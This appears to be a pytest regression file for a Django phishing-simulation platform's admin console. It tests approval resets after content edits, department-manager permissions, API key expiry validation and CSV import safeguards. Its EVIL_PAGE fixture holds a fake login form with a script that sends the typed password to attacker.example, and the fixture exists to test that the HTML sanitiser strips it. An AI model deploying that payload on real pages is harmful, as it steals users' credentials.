"""Regressions from the 2026-09-25 end-to-end admin-console review (opus_comments/phase3_admin_console.md)."""

import pytest
from django.urls import reverse
from django.utils import timezone

from apps.api.tests.test_api import call, make_key
from apps.campaigns.models import Campaign, EmailDraft
from apps.campaigns.tests.factories import CampaignFactory
from apps.core.models import AuditLogEntry
from apps.engine.tests.fakes import FakePhishingEngineClient
from apps.manage.tests.test_manage import login

pytestmark = pytest.mark.django_db

EVIL_PAGE = (
    '<form action="https://attacker.example/steal"><input name="u"><input type="password" name="p"></form>'
    "<script>document.forms[0].onsubmit=()=>fetch('https://attacker.example/?p='+document.forms[0].p.value)</script>"
)


@pytest.fixture
def engine(monkeypatch):
    fake = FakePhishingEngineClient()
    monkeypatch.setattr("apps.manage.views.get_client", lambda: fake)
    monkeypatch.setattr("apps.api.views.get_client", lambda: fake)
    return fake


def _approved(**kwargs):
    return CampaignFactory(status=Campaign.Status.APPROVED, approved_at=timezone.now(), **kwargs)


# --- A1: a content change after approval sends the campaign back to Draft ---------------------


def test_editing_an_approved_campaigns_email_resets_its_approval(client, django_user_model, engine):
    login(client, django_user_model, "Campaign Manager")
    draft = EmailDraft.objects.create(name="Payroll", subject="Payroll", layout="minimal", body_html="<p>v1</p>")
    approved = _approved(template_name="Payroll")
    launched = CampaignFactory(status=Campaign.Status.LAUNCHED, template_name="Payroll")
    unrelated = _approved(template_name="Other")

    client.post(reverse("manage:template-edit", args=[draft.pk]),
                {"name": "Payroll", "subject": "Payroll", "layout": "minimal", "body_html": "<p>v2, more urgent</p>"})

    for campaign in (approved, launched, unrelated):
        campaign.refresh_from_db()
    assert approved.status == Campaign.Status.DRAFT and approved.approved_at is None
    assert launched.status == Campaign.Status.LAUNCHED  # history is never rewritten
    assert unrelated.status == Campaign.Status.APPROVED
    assert AuditLogEntry.objects.filter(action="campaign_approval_reset").count() == 1


def test_editing_an_approved_campaigns_landing_page_resets_its_approval(client, django_user_model, engine):
    login(client, django_user_model, "Campaign Manager")
    pending = CampaignFactory(status=Campaign.Status.PENDING_APPROVAL, landing_page_name="Login")

    client.post(reverse("manage:page-new"), {"name": "Login", "html": "<form><input name='u'></form>", "capture_credentials": "on"})

    pending.refresh_from_db()
    assert pending.status == Campaign.Status.DRAFT


def test_an_api_key_cannot_change_what_an_approved_campaign_sends(client, django_user_model, engine):
    _, raw = make_key(django_user_model)
    approved = _approved(template_name="Invoice", landing_page_name="Invoice page")

    call(client, "email-templates", raw, "post", {"name": "Invoice", "subject": "s", "html": "<p>changed</p>"})
    approved.refresh_from_db()
    assert approved.status == Campaign.Status.DRAFT

    approved.status = Campaign.Status.APPROVED
    approved.save()
    call(client, "landing-pages", raw, "post", {"name": "Invoice page", "html": "<form></form>"})
    approved.refresh_from_db()
    assert approved.status == Campaign.Status.DRAFT
    assert AuditLogEntry.objects.filter(action="campaign_approval_reset", metadata__via="api").count() == 2


# --- A2: pasted landing-page HTML gets the same allow-list as a cloned page -------------------


def _assert_safe(html):
    assert "<script" not in html.lower() and "attacker.example" not in html
    assert 'type="password"' in html  # kept native, so the engine's capture_passwords=False strips it


def test_pasted_landing_page_html_is_sanitised(client, django_user_model, engine):
    login(client, django_user_model, "Campaign Manager")
    client.post(reverse("manage:page-new"), {"name": "Evil", "html": EVIL_PAGE, "capture_credentials": "on"})
    _assert_safe(engine.pages["Evil"]["html"])


def test_api_landing_page_html_is_sanitised(client, django_user_model, engine):
    _, raw = make_key(django_user_model)
    response = call(client, "landing-pages", raw, "post", {"name": "Evil", "html": EVIL_PAGE})
    assert response.status_code == 201 and response.json()["warnings"]
    _assert_safe(engine.pages["Evil"]["html"])


def test_api_email_html_is_sanitised(client, django_user_model, engine):
    _, raw = make_key(django_user_model)
    call(client, "email-templates", raw, "post",
         {"name": "E", "subject": "s", "html": '<p>Hi</p><script>x()</script><a href="https://attacker.example">go</a>'})
    html = engine.email_templates["E"]["html"]
    assert "<script" not in html and "attacker.example" not in html and "{{.URL}}" in html


# --- A4: a Department Manager can read shared content but not change it ------------------------


def test_department_manager_cannot_change_org_wide_content(client, django_user_model, engine):
    user = login(client, django_user_model, "Department Manager")
    from apps.employees.tests.factories import DepartmentFactory

    DepartmentFactory().managers.add(user)
    draft = EmailDraft.objects.create(name="Shared", subject="s", layout="minimal", body_html="<p>v1</p>")
    other_departments_campaign = _approved(template_name="Shared")

    assert client.get(reverse("manage:content")).status_code == 200
    assert b"Write an email" not in client.get(reverse("manage:content")).content
    for url, data in [
        (reverse("manage:template-edit", args=[draft.pk]), {"name": "Shared", "subject": "s", "layout": "minimal", "body_html": "<p>v2</p>"}),
        (reverse("manage:page-new"), {"name": "P", "html": "<form></form>"}),
        (reverse("manage:landing-clone"), {"name": "C", "url": "https://example.com"}),
        (reverse("manage:template-duplicate", args=[draft.pk]), {}),
        (reverse("manage:smart-group-new"), {"name": "G"}),
    ]:
        assert client.post(url, data).status_code == 403, url
    draft.refresh_from_db()
    other_departments_campaign.refresh_from_db()
    assert draft.body_html == "<p>v1</p>" and other_departments_campaign.status == Campaign.Status.APPROVED


# --- A3: API key expiry dates are validated ----------------------------------------------------


@pytest.mark.parametrize("value", ["2026-02-30", "2026-13-01", "not-a-date", "1999-01-01"])
def test_invalid_or_past_api_key_expiry_is_refused(client, django_user_model, value):
    from apps.api.models import ApiKey

    login(client, django_user_model, "Security Admin")
    response = client.post(reverse("manage:api-keys"), {"name": "k", "scopes": ["reports:read"], "expires_at": value})
    assert response.status_code == 200
    assert not ApiKey.objects.exists()


# --- A5: the CSV import can't offboard the organisation or dodge the exemption controls ---------


def _import(client, text, **extra):
    from django.core.files.uploadedfile import SimpleUploadedFile

    return client.post(reverse("manage:employee-import"),
                       {"file": SimpleUploadedFile("p.csv", text.encode(), content_type="text/csv"), **extra})


def test_import_refuses_a_mass_deactivation_and_rolls_everything_back(client, django_user_model):
    from apps.employees.models import Employee
    from apps.employees.tests.factories import EmployeeFactory

    login(client, django_user_model, "Security Admin")
    people = [EmployeeFactory() for _ in range(20)]
    response = _import(client, f"email,full_name\n{people[0].email},{people[0].full_name}\nnew@x.example,New Person\n",
                       deactivate_missing="1")

    assert b"Nothing was imported" in response.content
    assert Employee.objects.filter(is_active=True).count() == 20
    assert not Employee.objects.filter(email="new@x.example").exists()


def test_import_never_deactivates_someone_whose_row_had_an_error(client, django_user_model):
    from apps.employees.tests.factories import EmployeeFactory

    login(client, django_user_model, "Security Admin")
    keep = [EmployeeFactory() for _ in range(20)]
    typo = keep[0]
    rows = "".join(f"{e.email},{e.full_name}\n" for e in keep[1:])
    _import(client, f"email,full_name\n{typo.email},\n{rows}", deactivate_missing="1")

    typo.refresh_from_db()
    assert typo.is_active


def test_import_exemptions_need_a_reason_and_are_audited(client, django_user_model):
    from apps.employees.models import Employee

    user = login(client, django_user_model, "Security Admin")
    _import(client, "email,full_name,is_exempt,exempt_reason\nno@x.example,No Reason,yes,\nok@x.example,Has Reason,yes,Parental leave\n")

    assert not Employee.objects.filter(email="no@x.example").exists()
    ok = Employee.objects.get(email="ok@x.example")
    assert ok.is_exempt and ok.exempt_reason == "Parental leave" and ok.exempt_set_by == user
    assert AuditLogEntry.objects.filter(action="exemption_set", metadata__via="import").count() == 1


def test_import_rejects_invalid_email_addresses(client, django_user_model):
    from apps.employees.models import Employee

    login(client, django_user_model, "Security Admin")
    response = _import(client, "email,full_name\nnot-an-email,Bad\n")
    assert not Employee.objects.filter(email="not-an-email").exists() and b"not a valid email" in response.content
